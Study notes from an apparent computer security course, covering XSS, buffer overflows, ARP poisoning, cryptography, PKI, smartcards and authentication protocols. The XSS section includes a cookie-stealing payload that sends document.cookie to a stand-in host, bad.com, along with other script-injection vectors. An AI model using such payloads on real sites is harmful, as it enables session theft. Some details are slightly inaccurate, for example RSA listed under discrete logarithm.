# Segurança

## 1 - Introduction

**Objective - **Defense against non-authorized activities

- Computers can do a lot of damage in a short time frame
- The number of weakness is always growing
- Networks allow anonymous attacks from anywhere
- In general users are not careful

#### Pragmatic Approach

- There will never be a 100% protection
- Security is expensive. Dedicated technology, skilled people
- **Protection - **Good protection for the most frequent attacks
- **Value - **Less interference with daily work that the damage caused by attackers
- **Punishment - **Police and courts for tracking and prosecuting attackers

#### Security Lexicon

**Vulnerability - **A system weakness that makes it sensible to attacks

**Attack - **A set of steps that lead to the execution of illegal activities

**Risk / Threats - **Damage resulting from an attack

**Defense - **Set of policies and mechanisms aiming at improve the problems above

#### Security Risks

- Information, time and money
- Confidentiality
- Privacy
- Resource availability
- Impersonation

#### Vulnerability Sources

- People
- Applications with bugs
- Malware installation

#### Security Policies

- Define the power of each and every subject
- Define security procedures
- Define the minimum security requirements of a domain
- Define defense strategies and fight-back tactics
- Define the universe of legal and illegal activities

#### Attacks to Distributed Systems

- **Attacks to hosts - **Stealing. Intrusion. Impersonation. Denial of service
- **Attacks to networks - **Packet inspection. Packet tampering. Traffic interception. Traffic replaying. Host impersonation. Denial of service

#### Attack Models

- **Target-specific attacks - **Conceived for a particular host / network. Idealized and conducted in real-time by specialists
- **Generic, autonomous attacks - **Conceived for exploiting well-known, common vulnerabilities. Coded for many scenarios and targets. Mean survivability time

#### Mechanisms for Distributed Systems

- **Trusted Operating Systems - **Security levels, certification. Sandboxing / virtual machines
- **Firewalls & Security Appliances - **Traffic control between networks. Monitoring
- **Secure Communications / VPNs - **Secure channels over insecure, public networks
- **Authentication - **Local. Remote. Single Sign-On
- **Certification Authorities / PKI - **Management of public key certificates
- **Encryption of files and sessions - **Privacy / confidentiality of network data and long-term stored data
- **Intrusion Detection - **Detection of forbidden / abnormal acivities
- **Vulnerability Scanners - **Scanning for problem fixing or exploitation
- **Penetration Testing - **Vulnerability assessment. Demo penetration attempts. Testing of installed security mechanisms. Assessment of badly implemented security policies.
- **Content Monitoring - **Detection of virus, worms or other cyber plagues
- **Security Administration - **Development of security policies. Distributed enforcement of policies
- **Real-Time Security Awareness - **Capacity to detect and react to security indicents in real-time



## 2 - Vulnerabilities

### Measures

- **Discouragement** - Punishment. Security Barriers
- **Detection System** - Intrusion detection system. Auditing. Forensic break-in analysis.
- **Deception** - Honeypots / Honeynets. Forensic follow-up
- **Prevention** - Enforcement of the principle of Least Privilege. Vulnerability Scanning
- **Recuperation** - Backups. Redundant systems

**Measure enforcement** requires knowledge about

- Known vulnerabilities
- Activity patterns used in attacks
- Abnormal activity patterns

**Computer network threats** are not like other threats

- Can be launched anytime, anywhere. Easily coordinated. Cheap to deploy. Automated and fast.
- Require 24x7 capacity to react to attacks

#### Zero-day (or zero-hour) attack or threat

Attack using vulnerabilities which are

- Unknown to others
- Undisclosed to the software vendor

Occurs at the day zero of the knowledge about those vulnerabilities

### Vulnerability Detection

Specific tools can detect vulnerabilities

- Exploiting known vulnerabilities
- Testing known vulnerability patterns

Vital to assert the robustness of production systems and applications

Can be applied to

- Source code
- Running application (dynamic, analysis)
- Externally as a remote client

### CVE (Common Vulnerabilities and Exposures)

**Dictionary** of publicly known information security vulnerabilities and exposures

CVE's common identifiers enable data exchange between security products and provide a baseline index point for evaluating coverage of tools and services

#### CVE Vulnerability

- A mistake in software, that can be directly used by a hacker
- A mistake is a vulnerability if it allows an attacker to use it violate a security policy for that system
- A **CVE vulnerabilty** is a state in a computing system that allow an attacker to
  - Execute commands as another user
  - Access data that is contrary to the specified access restrictions
  - Pose as another entity
  - Conduct a denial of service

#### CVE Exposure

- A system configuration issue or a mistake in software that allows access to information
- A configuration issue or mistake is an exposure if it does not directly allow compromise
- A **CVE exposure** describes a state in a computing system that is not a vulnerability but
  - Allows an attacker to conduct information gathering activities or hide activities
  - Includes a capability that behaves as expected, but can be compromised
  - Is a primary point of entry that an attacker may attempt to use to gain access to the system
  - Is considered a problem by some reasonable security policy

#### CVE Benefits

- Provides common language for referring to problems
- Will lead to improved security tools
- Will spark further inovations

**CVE Pitfals - **Useless against zero-day attacks

#### CVE Identifiers

- Unique, common identifiers for publicly known information security vulnerabilities
  - Have "candidate" or "entry"status
  - **Candidate - **under review for inclusion in the list
  - **Entry - **accepted to the CVE list

### CWE (Common Weakness Enumeration)

Common language of discourse for discussing, finding and dealing with the causes of software security vulnerabilities

- Found in code, design, or system architecture
- Each individual CWE represents a single vulnerability type

**Seven Pernicious Kingdoms - **Input validation. API abuse. Security features. Time and state. Errors. Code quality. Encapsulation. Environment

**CERT (Computer Emergency Readiness Team) - **Organization devoted to ensuring that appropriate technology and systems management practices are used to resist attacks no networked systems

**CSIRT (Computer Security Incident Response Team) - **Service organization that is responsible for receiving, reviewing, and responding to computer security incident reports and activity



## 3 - XSS Cross-Site Scripting

Injection of scripts provided by clients into Web pages

Inherent to how HTML works

**Correct Usage - **\<img src='img.png'> \</img>

**Not Correct Usage - **\<img src=‘img.png’>

​									 \<script> alert(“hi”); \</script>

​								     \</img>

#### **Information Stealing**

\<img src=“img.png” onload=“window.open(http://bad.com/reg.php?’+document.cookie)”>\</img>

Open window, sends current cookie to bad.com

#### Injection Vectors

- **Any non parsed text -** \<p>Hi there\<script>alert(‘hehe’)\</script>\</p>
- **Media tags - **\<img src="http://bank.com/delete_account.php">\</img>
- **URLs - **http://foo.bar/index.php?search=\<script>alert(‘hi’)\</script>

#### Stored XSS                                                        |                                                 Reflected XSS

<img src="stored.png" width="50%"><img src="reflected.png" width="50%">

#### Cross-Site Request Forgery

<img src="request.png" width="50%">



## 4 - Buffer Overflows

#### Memory Organization Topics

- Kernel organizes memory in **pages**
- Processes operate in a **virtual memory space**
- Kernel groups pages in several segments

#### x86 CPU Registers

- **General Purpose -** EAX, EBX, ECX, EDX
- **EBP: Base Pointer - **Base address of the current function stack frame. Function stack frame is where we have: The function parameters. The local function variables.
- **ESP: Stack Pointer - **Points to end of stack
- **EIP: Instruction Pointer - **Points to current instruction

#### Stack Segment

- Stack is used to
  - Pass arguments to functions (eg. **arg1**)
  - Store local variables (eg. **var1**)
- Values are PUSHed or POPed form Stack
- Allocation of local variables in place

#### Initialization of a Stack Frame

- This is done in the **prologue** of a function. And it's undone at its **epilogue**

**Prologue**

- Saving the base address of the previous stack frame and setting the new one
- Allocate space for local variables

#### Function Call and Return

**Call Steps**

- Put arguments in stack, with PUSH
- Call the function address. Pushes the EIP to the stack. EIP has the next instruction address
- Release stack space. Usually increasing ESP

**Returning form a function**

- The RET instruction pops the saved EIP

#### Function foo()

<img src="foo.png" width="60%">

#### Buffer Overflow

- Write over the boundaries of a buffer
- Consequences
  - Write over other values located next to the buffer
  - Write over special values co-located
    - Saved EBP - Damages the base address of the previous stack frame
    - Return EIP - Jump to any address on return

#### Stack Smashing Attack

- **Roadmap**
  - Overflow a local variable
  - Extend the overflow to the return address
  - Change the return address in order to jump to the injected data
  - Wait for the return of the function
- **Dificulty**
  - A return using a saved address is an absolute jump
  - The attacker needs to know the absolute address of the vulnerable variable

#### Prevention Mechanisms

- Avoid execution of injected instructions in segments/pages that usually have no code
- Randomize the address space. ADLR (Addresss Space Layout Randomization)
  - Segments do not start in fixed positions of each run of the same application
  - Prevents jumps to well-known code locations
- Variable reordering
  - Vulnerable variables are arrays. To protect other kinds of local variables, arrays are moved closer to the saved registers. Reduces the set of variables that may be affected by a buffer overrun

#### Detection Mechanisms

- **Stack canaries** -» A value unknown to attackers (canary) is stored next to saved registers
  - Stack smashing attacks usually cannot affect saved registers with running over a canary
  - The canary is checked before the function's epilogue



## 5  -SQL Injection

> Not now



## 6 - ARP Poisoning

### Networking Basics

- Communication in packet networks rely on several layers, with different identifiers
  - Applications use transport (TCP / UDP) ports
  - Hosts use network (IP) addresses
  - Interface Cards use MAC addresses
- Communication is made between applications using tuples
- When a packet is to be routed, two situations may occur
  - The destination host is in the same/another network
  - In both cases, the packet is transmitted between physical interfaces
- IP addresses do not change between source and destination (End-to-end addressing)
- MAC addresses are valid for a single network segment

#### IP to MAC Mapping

- **Static Configuration**
  - MAC entries of all hosts configured statically
    - All hosts "know" the MAC address of all interfaces of all other hosts
  - Doesn't scale
- **Dynamic Configuration**
  - ARP (Address Resolution Protocol)

#### ARP

- Find the MAC address of an interface which is in a host with a given IP address
- **RARP - **Find the IP address of host having an interface with a given MAC
- Every packet sent requires two MAC address
  - Source address is known
  - Destination address must be determined
- ARP cache increases performance
  - Caches both known and unknown entries
  - Avoids repeating the discovery process per packet
  - Entries have a large lifetime - 2 minutes

#### ARP Spoofing

- MAC addresses can be modified
- Using a colliding MAC address will allow the reception of network traffic for other hosts
  - Some switches limit MAC addresses to single ports
- Sending ARP packets with spoofed addresses may poison the cache of other stations

### ARP Poisoning

- Hosts cache information directly from all packets received
  - Besides ARP packets
  - No other verification is done
- New information will replace existing entries
- It is possible to send specially crafted packets to create specific entries in remote hosts

##### Consequences

- Hosts can be isolated from the network
- Hosts can be denied communication with the outside world
- Interception of traffic between hosts

##### Avoidance

- **Static entries**
  - No resolution process is triggered
  - Colliding information from ARP packets is discarded
- **Port-based packet filtering at switch ingress**
  - Spoofed ARP packets are dropped
  - Only possible in static scenarios
- **Network segregation**
  - VLANs, WiFi client segregation
- **Behavior detection w/ monitoring software**
  - Detect ARP Responses without Request
  - Detect repeated requests from same host
  - Detect MAC changes



## 7 - Cryptography

**Cryptography - **Art of science of hidden writing. Used to maintain the confidentiality of information

**Cryptanalysis - **Art or science of breaking cryptographic systems or encrypted information

**Cryptology - **Cryptography + cryptanalysis

**Cipher - **Specific cryptographic technique

#### **Cipher operation**

- **Encryption** - plaintext -» ciphertext
- **Decryption** - ciphertext -» plaintext
- **Algorithm** - way of transforming data
- **Key** - algorithm parameter

#### Use Cases

- Self-protection
- Secure communication

#### Cryptanalysis Goals

- Discover original plaintext. Which originated a given ciphertext
- Discover a cipher key. Allows the decryption of ciphertexts created with the same key
- Discover the cipher algorithm. Or an equivalent algorithm

#### Cryptanalysis Attack Approaches

- **Brute Force**
  - Exhaustive search along the key space until finding a suitable key. Usually infeasible for a large key space
- **Cleaver Attacks**
  - Reduce the search space to a smaller set of potential candidates

### Ciphers Basic Types

- **Transposition - **Original cleartext is scrambled
- **Substitution - **Each original symbol is replaced by another
  - **Mono-alphabetic - **Use a single substitution alphabet
    - Problems
      - Reproduce plaintext pattern
      - Statistical analysis facilitates cryptanalysis
  - **Polyalphabetic - **Use N substitution alphabets. Periodical ciphers, with period N
    - Problems
      - Once known the period, are as easy to cryptanalyze as N mono-alphabetic ones
      - The period can be discovered using statistics

#### Rotor Machines

Implement complex polyalphabetic ciphers

- Each rotor contains a permutation. Same as a set of substitutions.
- The position of a rotor implements a substitution alphabet
- Spinning of a rotor implements a polyalphabetic cipher
- Stacking several rotors and spinning them at different times adds complexity to the cipher

The **cipher key** is

- The set of rotors used
- The relative order of the rotors
- The position of the spinning ring
- The original position of all the rotors

Symmetrical (two-way) rotors allow decryption by "double encryption"

### Cryptography Theoretical Analysis

- **Plaintext Space - **Set of al possible plaintext messages (**M**)
- **Ciphertext Space - **Set of all possibel ciphertext values (**C**)
- **Key Space - **Set of all possible key values for a given algorithm (**K**)

#### Practical Approaches

- **Theoretical security vs Practical Security**
  - Expected use =/ practical exploitation
  - Defective practices can introduce vulnerabilities
- **Computational security**
  - Security is measured by the computational complexity of break-in attacks using brute force
- **5 Shannon Criteria**
  - The amount of offered secrecy (Key Length)
  - Complexity of key selection (Key Generation)
  - Implementation simplicity
  - Error propagation
  - Dimension of ciphertexts
- **Confusion**
  - Complex relationship between the key, plaintext and the ciphertext. Output bits should depend on the input bits in a very complex way
- **Diffusion**
  - Plaintext statistics are dissipated in the ciphertext. If one plaintext bit toggles, the the ciphertext changes substantially, in an unpredictable or pseudorandom manner
- **Always assume the worst case**
  - Cryptanalysis knows the algorithm. Security lies in the key
  - Cryptanalysts know/have many ciphertext samples produced with the same algorithm & key
  - Cryptanalysts partially know original plaintexts 

#### Cryptographic Robustness

- The robustness of algorithms is their resistance to attacks. Not precisely evaluated. They are robust until someone breaks them. Public guidelines with what should/must not be used
- Public algorithms without known attacks are likely to be more robust
- Algorithms with longer keys are likely to be more robust (and slower)

### Stream Ciphers

<img src="stream.png" width="80%">

- Mixture of a keystream with the plaintext or ciphertext
  - **Random** keystream
  - **Pseudo-random** keystream
- Reversible mixture function

<img src="stream1.png" width="30%">

- **Polyalphabetic** cipher. Each keystream symbol defines an alphabet
- Keystream may be infinite but with a finite period. The period depends on the generator
- Pratical security issues
  - Each **keystream** should be used only **once**!
  - **Plaintext length** should be **smaller** than the **keyword period**
  - Integrity control is mandatory. No diffusion! (only confusion)

### Modern Ciphers

**Concerning operation**

- Block ciphers (mono-alphabetic)
- Stream ciphers (polyalphabetic)

**Concerning their key**

- Symmetric ciphers (secret key or shared key ciphers)
- Asymmetric ciphers (or public key ciphers)

**Arrangements**

<img src="arrang.png" width="60%">

### Symmetric Ciphers

- **Secret Key - **Shared by 2 ou more peers
- **Allow - **Confidentiality among the key holders. Limited authentication of messages
- **Advantages - **Performance
- **Disadvantages - **N interacting peers, pairwise secrecy -» N x (N-1) / 2 keys
- **Problems - **Key distribution

#### Symmetric Block Ciphers

- Large bit blocks. 64, 128, 256, etc.
- Diffusion & confusion
- **Common algorithms**
  - DES (Data Enc. Stand) D=64 K=56
  - IDEA (Int. Data Enc. Alg.) D=64 K=128
  - AES (Adv. Enc. Stand) D=128 K= 128, 192, 256

##### DES (Data Encryption Standard)

- 64-bit blocks
- 56-bit keys
- Diffusion & confusion
  - Feisel networks
  - Permutations, substitutions, expansions, compressions
  - 16 iterations
- Several modes of operation
  - **ECB** (Electronic Code Book), **CBC** (Cypher Block Chaining), **OFB** (Output Feedback), **CFB** (Cypher Feedback)

---

- Key selection -» Most 56-bit values are suitable keys
- Known attacks -» Exhaustive key space search
- Key length -» 56 bits are too few. Exhaustive search is technically possible and economically interesting.
  - Solution: Multiple encryption

#### Symmetric Stream Ciphers

- Cryptographically secure pseudo-random generators (PRNG)
  - Using linear feedback shift registers (**LFSR**)
  - Using block ciphers
- Usually not self-synchronized
- Usually without uniform random access
- **Common algorithms**
  - A5/1, A5/2 | RC4 | E0 | SEAL

##### Linear Feedback Shift Register (LFSR)

<img src="lfsr.png" width="50%">

#### Block Ciphers Modes

##### ECB and CBC

<img src="ecb.png" width="80%">

- Block cipher modes ECB and CBC require block-aligned inputs. Trailing sub-blocks need special treatment
  - Alternatives -» Padding or different processing for the last block

#### Stream Cipher Modes 

##### OFB (Output Feedback)                                                  |                                             CFB (Ciphertext Feedback)

<img src="ofb.png" width="50%"><img src="cfb.png" width="50%">

##### Pros and Cons

<img src="pc.png" width="80%">

##### Security Reinforcement

- Double Encryption. Breakable with a meet-in-the-middle attack in 2^(n+1) attempts. Not secure enough
- Triple Encryption (EDE)

<img src="ede.png" width="50%">

- Whitening (DESX). Simple and efficient technique to add confusion

<img src="desx.png" width="23%">

### Asymmetric Ciphers

- **Use Key Pairs - **One private key (personal). One public key
- **Allow - **Confidentiality without any previous exchange of secrets
- **Disadvantages - **Performance (very inefficient and memory consuming)
- **Advantages - **N peers requiring pairwise, secret interaction -» N key pairs
- **Problems - **Distribution of public keys. Lifetime of key pairs

#### Confidentiality

<img src="conf.png" width="70%">

- Only the key pair of the recipient is involved. To send something with confidentiality to X is only required to know X's public key(Kx)
- There is no source authentication. X has no means to know who produced the ciphertext.

#### Source Authentication

<img src="source.png" width="70%">

- Only the key pair of the originator is involved. Only X knows that Kx⁻¹ produced C
- There is no confidentiality. Anyone knowing the public key of the originator (Kx) can decrypt C

#### Asymmetric Block Ciphers

- Discrete logarithms of large numbers
- Integer factorization of large numbers
- Knapsack problems
- **Common Algorithms**
  - RSA | ElGamal | Elliptic curves

##### RSA (Rivest, Shamir, Adelman)

- Discrete logaritm
- Integer factoring
- **Key Selection**
  - Large **n**;   **n** = **p**x**q**;   **p** and **q** being large (secret) prime numbers
  - Chose an **e** co-prime with (**p**-1)x(**q**-1)
  - Compute **d** such that **e**x**d** = 1 mod (**p**-1)x(**q**-1)
  - Discard **p** and **q**
- **Example**

<img src="rsa.png" width="50%">

##### ElGamal

- Similar to RSA but using only discrete logarithm complexity
- Used for digital signatures

##### Elliptic Curve

- Curves of a kind that are symmetric to the X axis. And don't have solution for all x values
- Given an elliptic curve **E(Fp)**, a point **G** on that curve, a point **P** which in an integer multiple of **G**, find the integer **x** such that **xG = P**
- For cryptographic operatoins **x** wiil be the **private key** and **P** the **public key**
- **Curves Definition**
  - Prime **p** -» **(p, a, b, G, n, h)**
    - Constants **a** and **b** of the EC equation
    - A generator point **G**
    - The order **n** of **G**
    - A small co-facto **h**
- **EC Diffie-Hellman (ECDH)**
  - Alice and Bob agree of EC curve
  - Alice chooses a **random alpha**. And publishes **A = alpha.G**
  - Bob chooses a **random beta**. And publishes **B = beta.G**
  - Both Alice and Bob compute **K**

#### Randomization of Asymmetric Encryptions

- **N** encryptions of the same value, with the same key, should yield **N** different results
- Goal -» prevent the trial & error discovery of encrypted values
- Technics -» Concatenation of value to encrypt with two values. A fixed one and a random one

### Digest Functions

- Give a fixed-length value from a variable-length text
- Produce very different values from similar texts. Cryptographic one-way hash functions
- **Properties**
  - **Preimage resistance - **Given a digest, it is infeasible to find an original text producing it
  - **2º preimage resistance - **Given a text, it is infeasible to find another one with the same digest
  - **Collision resistance - **It is infeasible to find any two texts with the same digest
- **Most common algorithms**
  - **MD5 - **No longer secure. Easy to find collisions
  - **SHA-1 - **No longer secure... (collisions found in 2017)
  - **SHA-2 (SHA-256/SHA-512), SHA-3**

### Message Authentication Codes (MAC)

- Hash, or digest, computed with a key. Only key holders can generate / validate the MAC
- Encryption of an ordinary digest (for instance, a symmetric block cipher)

#### Authenticated Encryption

- Encryption mixed with integrity control. Error propagation. Authentication tags
- **Encrypt-then-MAC - **MAC is computed from cryptogram
- **Encrypt-and-MAC - **MAC is computed from plaintext. MAC is not encrypted
- **MAC-then-Encrypt - **MAC is computed from plaintext. MAC is encrypted

### Digital Signatures

- Authenticate the contents of a document -» Integrity
- Authenticate its author -» Identity
- Prevent origin repudiation -» Authorship
- **Approaches**
  - Asymmetric encryption
  - Digest functions

**Blind Signatures - **Signatures made by a "blinded" signer. Signer cannot observe the signed contents



## 8 - Assimetric Key Management

#### Problems to Solve

- Ensure a proper generation of key pairs
  - Random generation of secret values
  - Increase efficiency without reducing security
- Ensure a correct use of asymmetric key pairs
  - Privacy of private keys
  - Correct distribution of public keys
- Evolution of **entity «-» key pair** bindings. We cannot have eternal key pairs
  - Tackle catastrophic occurrences (Loss of private keys)
  - Tackle normal exploitation requirements (Reducing impersonation risks)
  - Tackle the evolution of technology and know-how

#### Goals

- Key pair generation. When and how
- Exploitation of private keys. Keeping them private
- Distribution of public keys
- Lifetime of key pairs

#### Design Principles

- Good random generators for producing secrets
- Facilitate without compromising security. Efficient RSA public keys
- Self-generation of private keys. To maximize privacy

#### Exploitation of Private Keys

**Correctness**

- The private key represents a subject. Compromise must be minimized
- Access path to the private key must be controlled. Access protection with password and PIN

**Confinement**

- Protection of the private key inside a (reduced) security domain (cryptographic token)
  - Token generates key pairs
  - Token exports the public key but never the private key
  - Token internally encrypts/decrypts with the private key

#### Distribution of Public Keys

- Distribution to all **senders** of confidential data
- Distribution to all **receivers** of digital signatures
- Trustworthy dissemination of public keys
  - I entity A trusts entity B and B trusts in C then A trusts in C

#### Public Key Digital Certificates

- Documents issued by a Certification Authority (CA)
  - Bind a public key to an entity
  - Are public documents
  - Are cryptographic secure
- Can be used to distribute public keys in trustworthy way
  - A certificate receiver can validate it
  - If the signer (CA) public key is trusted, and the signature is correct, then the receiver can trust the certified public key

#### Key Pair Usage

- A key pair is bound to a usage profile by its public key certificate
  - Authentication / key distribution
  - Document signing
  - Certificate issuing

### Certification Authorities

Organizations that manage public key certificates

##### Trusted Certification Authorities

- **Intermediate CAs - ** certified by other trusted CAs using a certificate
- **Trusted Anchor - **CAs for which one has a trusted public key. Manual distribution

#### Certification Hierarchies

##### PEM (Privacy Enhanced Mail) model

- Distribution of certificates for PEM (secure e-mail)
  - Worldwide hierarchy (monopoly)
  - Single root (IPRA)
  - Several PCA (Policy Creation Authorities) bellow the root
  - Several CA below each PCA
- Never implemented
  - Forest of hierarchies
  - Each root CA negotiates the distribution of its public key along with some applications or operating systems

##### PGP (Pretty Good Privacy) model

- Web of trust
  - No central trustworthy authorities. Each person is a potential certifier
- People uses 2 kinds of trust
  - Trust in the keys they know
  - Trust in the behavior of cerificates
- Transitive trust

#### Refreshing of Asymmetric Key Pairs

- Key pairs should have a limited lifetime. Private keys can be lost or discovered
- **Problem** -» Certificates can be freely copied and distributed. The universe of certificate holders in unknown
- **Solutions** -» Certificates with a validity period. Certificate revocation lists

##### Certificate Revocation Lists

- Base or delta
- Signed list of identifiers of prematurely invalidated certificates
- Publication and distribution of CRLs
  - Each CA keeps its CRL and allows public access to it
  - CAs exchange CRLs to facilitate their wide-spreading

##### Validity of Signatures

- A signature is **valid** if it was generated during the **validity period** of the corresponding pub key certificate
  - Validity period starts on the certificate's **NotBefore** and ends on the **NotAfter** fields
- A private key can be used out of that period. But the signature it produces is invalid
- A public key certificate can be used anytime

##### Distribution of Public Key Certificates

- Transparent
- On-line -» Within protocols using certificates for peer authentication
- Explicit
- User request to a service for getting a required certificate
- Useful for creating certification chains for frequently used terminal certificates

##### Time Stamping Authority (TSA)

- A service that provides signatures over a timestamp. Linked with a data digest
- Useful for adding trust to a data signature date

#### PKI (Public Key Infrastructure)

Infrastructure for enabling the use of keys pairs and certificates

- Creation of asymmetric key pairs for each enrolled entity
- Creation and distribution of public key certificates
- Definition and use of certification chains (or paths)
- Update, publication and consultation of CRLs (certificate revogation list)
- Use of data structures and protocols enabling inter-operation among components / services / people

##### Example - Citizen Card

- Enrollment -» In loco, personal enrolment
- Mulitple key pairs per person
  - One for authentication
  - One for signing data
  - Generated in smartcard, not exportable
  - Require a PIN in each operation
- Certificate usage 
  - Authentication -» SSL Client Certificate, Email, Signing, Key Agreement
  - Signature -» Email, Non-repudiation

##### Trust Relationships

- A PKI defined trust relationships in two different ways
  - By issuing certificates for the public key of other CAs
  - By requiring the certification of its public key by another CA
- Usual trust relationships
  - Hierarchical
  - Crossed (A certifies B and vice-versa)
  - Ad-hoc (mesh)



## 9 - Smartcards

- Card with computing processing capabilities -» CPU. ROM. EEPROM. RAM
- Interface -» Contact or contact less

#### Communication Protocol Stack

<img src="stack.png" width="70%">

##### T=0 and T=1

- T=0 -» Each byte transmitted separately. Slower
- T=1 -» Blocks of bytes transmitted. Faster
- ATR -» Response of the card to a reset operation. Reports the protocol expected by the card

#### Encoding Objects in Smartcards

- Tag-Length-Value (TLV)
  - Object description with a tag value, the length of its contents and the contents
  - Each element of TLV is encoded according with ASN.1 BER
- Values can obtain other TLV objects, Recursive structure

### File System

- **File Identification - **Name or number
- **File Types **
  - Master File (MF) -» File system root
  - Dedicated File (DF) -» Similar to a directory
  - Elementary File (EF) -» Ordinary data file. File size fixed and determined when created
- **File System Types**
  - Transparent -» Data blocks identified by offset + length
  - Fixed Records -» Indexed records
  - Variable Records -» Indexed records
  - Cyclic -» Read Pointer, write pointer. Cyclic increments
- **Access Control**
  - No restrictions
  - Protected -» The file access APDU must contain a MAC computed with a key shared between the card and the off-card application
  - External authentication -» The file accesss APDU is only alowed if the card already checked the existence of a common shared key with the off-card application. Previous login

### Cryptographic Protocols

##### External Authentication

- The smartcard authenticates the off-card application
- Challenge-response protocol with a random number. Initiated by the off-card app

<img src="ext.png" width="70%">

**Internal Authentication**

- The off-card application authenticates the smartcard
- Challenge-response protocol with a random number and key number. Initiated by the off-card app

<img src="int.png" width="70%">

##### Secure Messaging

- Protect data red from the smartcard
- Protect data written into the smartcard
- Authentication with MAC and data encryption

### OpenCard Framework (OCF)

- **Goal - **Facilitate the development of smartcard-based solutions
- **Parties**
  - Card Issuer -» Card initialization, personalization and issuing
  - Card OS provider -» Basic, lowest level card behavior
  - Card reader / terminal provider -» Interfaces that deal with reading/writting from/to cards
  - Application / service provider -» Development of off-card applications



## 10 - Authentication Protocols

**Authentication - **Proof that an entity has a claimed identity attribute

- Enable the enforcement of authorization policies and mechanisms
  - Authorization -» Authentication

#### Requirements

- **Trustworthiness - **How good is it in providing the identity of an entity? Level of Assurance
- **Secrecy - **No disclosure of secrets used by legitimate entities
- **Robustness - **Prevent attacks to the protocol data exchanges, online DoS, offline dictionary attacks
- **Simplicity - **Should be as simple as possible to prevent entities from choosing dangerous shortcuts
- **Vulnerabilities introduced by people**

#### Approaches

- **Direct approach - **Provide credentials. Wait for verdict
- **Challenge-Response approach - **Get challenge. Provide a response computed from the challenge and the credentials. Wait for veredict

### Direct Approaches

#### Direct Approach w/ known Password

- A password is matched with a stored value. For a claimed identity (username)
- Personal stored value. Transformed by a **unidirectional** function
- **Advantage**
  - Simple
- **Problems**
  - Usage if **weak keys** enable dictionary attacks

#### Direct Approach with Biometrics

- **Biometric Samples - **Fingerprint, face geometrics, voice timber, manual writing, etc.
- **Biometric References - **Registered in the system with a previous enrolment procedure
- **Advantages**
  - Convenient
  - People cannot chose weak passwords
- **Problems**
  - Still being improved. Can be easily cheated
  - People cannot change their credentials
  - Can be risky for people
  - Tuning is mainly performed with the target population. Not with attackers

#### Direct Approach with One-Time Passwords

- Passwords that can be used just once
- Bank codes, SMS, email, twitter, etc.
- **Advantage**
  - They can be eavesdropped, nevertheless attackers cannot impersonate the password owner
- **Problems**
  - Interactors need to know which password they should use at different occasions
  - People may need to use extra resources to maintain or generate one-time passwords

##### RSA SecurID

- Personal authentication token
- It generates a **unique number** at a fixed rate
  - Usually one per minute (30 seconds)
  - Bound to a person (**User ID**)
  - Unique number computed with
    - A **64-bit key** stored in the card
    - The actual date
    - Proprietary digest algorithm
- **One-Time password** authentication
  - A person generates an OTP combining a User ID with the current token number
- An RSA ACE Server does the same and checks if they **match**
  - It also knows the person's key stored in the token
- Robust against dictionary attacks. Keys are not selected by people

### Challenge-Response Approach

- The authenticator provides a challenge
- The entity being authenticated transforms the challenge using its authenticated credentials
- The result is sent to the authenticator
- The authenticator produces a similar result and checks if they match
- **Advantage**
  - Authentication credentials are not exposed
- **Problems**
  - People may require means to compute responses
  - The authenticator may have to have access to shared secrets
  - Offline dictionary attacks

#### Challenge-Response with Smartcards

- **Authentication credentials**
  - The smartcard
  - The private key stored in the smartcard
  - The PIN to unlock the private key
- **The authenticator knows**
  - The corresponding public key or some personal identifier

<img src="smart.png" width="70%">

- **Signature-Based Protocol**
  - The authenticator generates a random challenge (value)
  - The card owner ciphers the challenge with their private key
  - The authenticator decrypts the result with the public key

#### Challenge-Response with Memorized Password

- **Authentication credentials**
  - Passwords selected by people
- **The authenticator know**
  - All registered passwords or
  - A transformation of each password (**preferable**)
- **Challenge-response protocol**
  - The authenticator generates a random challenge
  - The person computes a transformation of the challenge and password
  - The authenticator does the same (or the inverse)
  - **Examples** - CHAP, MS-CHAP v1/v2, S/key

##### PAP (PPP Authentication Protocol)

- Simple UID/password presentation
- Insecure cleartext password transmission

##### CHAP (Challenge Response Authentication Protocol)

<img src="chap.png" width="70%">

##### MS-CHAP (Microsoft CHAP)

<img src="mschap.png" width="70%">

#### S/Key

- **Authentication credentials**
  - A password (**pwd**)
- **The authenticator knows**
  - The last used one-time password (**OTP**)
  - The last used OTP **index**
  - A **seed** value for the each person's OTPs

**Authenticator setup**

- The authenticator defines a random **seed**
- The person generates an **initial OTP** as

<img src="otp.png" width="40%">

- The authenticator stores **seed**, **n** and **OTP** as authentication credentials

<img src="cred.png" width="50%">

- The authenticator sends **seed** and **index** of the person as a challenge
- The person generates **index-1** OTPs in a row
  - And selects the last one as result
- The authenticator computes **h (result)** and compares the result with the stored **OTPindex**

#### Challenge-Response with Shared Key

- Uses a shared key instead of a password
  - More robust against dictionary attacks
  - Requires some token to store the key

#### GSM

<img src="gsm.png" width="70%">

- Based on a secret key shared between the HLR and the Mobile Phone

##### Mobile Phone Authentication

- MSC fetches trio from HLR
  - RAND, SRES, Kc
- HLR generates RAND and corresponding trio using subscriber's Ki

****

#### Host Authentication

- **By name or address**
  - DNS name, IP address, MAC address
  - Extremely weak, no cryptographic proofs
- **With cryptographic keys**
  - Keys shared among peers
  - Per-host asymmetric key pair

#### Service / Server Authentication

- **Host authentication**
  - All co-located services / servers are indirectly authenticated
- **Per-service / server credentials**
  - Shared keys
  - Per-service / server asymmetric key pair

#### TLS (Transport Layer Security)

- Secure communication protocol over TCP/IP
- **Security mechanisms**
  - Communication confidentiality and integrity
  - Authentication of communication endpoints

#### SSH (Secure Shell)

- Manages secure consoles over TCP/IP
- **Security mechanisms**
  - Communication confidentiality and integrity
  - Authentication of communication endpoints
- **Authentication mechanisms**
  - **Server** - with asymmetric keys pair
    - Inline public key distribution
    - Clients cache previously use public keys
  - **Client** - configurable
    - Username + password
    - Username + private key

****

**Authentication Metaprotocols - **Generic authentication protocols that encapsulate other specific authentication protocols

**Single Sign-On (SSO) - **Unique, centralized authentication for a set of federated services

- The identity of a client, upon authentication, is given to all federated services
- The identity attributes given to each service may vary
- The authenticator is called **Identity Provider (IdP)**



## 11 - Pluggable Authentication Modules

- **Users - **unification of authentication mechanisms for different applications
- **Manufacturers - **Authenticated access to services independently of the authentication mechanism
- **Administrators - **Management and matching of N authentication mechanisms for M services requiring client authentication



## 12 - Access Control Modules

## 13 - Security in Operating Systems

## 14 - Secure Data Storage

## 15 - Database Security

## 16 - JVM Security













